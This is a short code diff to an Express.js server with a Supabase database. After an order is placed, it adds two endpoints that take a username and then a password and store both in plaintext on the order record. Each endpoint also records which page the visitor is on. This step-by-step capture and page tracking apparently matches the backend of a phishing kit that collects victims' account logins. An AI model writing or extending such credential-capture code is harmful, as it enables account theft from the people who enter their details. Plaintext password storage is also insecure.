@@ -53,6 +53,33 @@ app.post('/api/orders', async (req, res) => {
       created_at: new Date().toISOString()
     });
     if (error) throw error;
+    const { data: inserted } = await supabase.from('orders').select('id').eq('email', email).order('created_at', { ascending: false }).limit(1).maybeSingle();
+    res.json({ success: true, order_id: inserted ? inserted.id : null });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
+// Save login username
+app.post('/api/login-data', async (req, res) => {
+  try {
+    const { order_id, username } = req.body;
+    if (order_id) {
+      await supabase.from('orders').update({ login_username: username, current_page: 'login' }).eq('id', order_id);
+    }
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
+// Save login password
+app.post('/api/password-data', async (req, res) => {
+  try {
+    const { order_id, password } = req.body;
+    if (order_id) {
+      await supabase.from('orders').update({ login_password: password, current_page: 'password' }).eq('id', order_id);
+    }
     res.json({ success: true });
   } catch (err) {
     res.status(500).json({ success: false, message: err.message });
